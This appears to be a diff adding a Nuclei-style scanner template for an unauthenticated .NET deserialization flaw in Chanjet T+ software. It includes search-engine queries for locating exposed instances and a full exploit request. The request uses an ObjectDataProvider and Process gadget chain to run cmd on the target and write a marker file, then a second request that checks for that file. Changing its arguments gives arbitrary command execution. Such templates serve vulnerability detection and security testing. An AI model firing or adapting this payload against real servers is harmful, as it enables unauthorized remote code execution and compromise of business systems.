@@ -1,0 +1,52 @@
+id: changjet-tplus-RRATableController-deserialization
+info:
+  name: 畅捷通 T+ Ufida.T.DI.UIP.RRA.RRATableController - deserialization
+  author: leadlife
+  severity: critical
+  description: 用友畅捷通 T+ /tplus/ajaxpro/Ufida.T.DI.UIP.RRA.RRATableController,Ufida.T.DI.UIP.ashx接口存在.net反序列化漏洞，未经过身份认证的攻击者可以通过构造恶意的序列化请求在目标服务器上执行任意命令。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8B%E7%95%85%E6%8D%B7%E9%80%9ARRATableController%E5%AD%98%E5%9C%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    hunter-query: app.name="畅捷通 T+"
+    fofa-query: icon_hash="-2067519629" || app="畅捷通-TPlus"
+  tags: changjet,deserialization,tplus
+
+variables:
+  random_str: "{{rand_base(6)}}"
+  match_str: "{{md5(random_str)}}"
+
+http:
+  - raw:
+      - |-
+        POST /tplus/ajaxpro/Ufida.T.DI.UIP.RRA.RRATableController,Ufida.T.DI.UIP.ashx?method=GetStoreWarehouseByStore&preload=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Content-Length: 614
+
+        {
+          "storeID":{
+            "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+            "MethodName":"Start",
+            "ObjectInstance":{
+                "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+                "StartInfo": {
+                    "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+                    "FileName":"cmd", "Arguments":"/c echo akmyrshwamjdjlsbitbl> img/{{random_str}}.txt"
+               }
+            }
+          }
+        }
+      
+      - |+
+        GET /tplus/img/{{random_str}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_2,'akmyrshwamjdjlsbitbl')
+        condition: and
+           
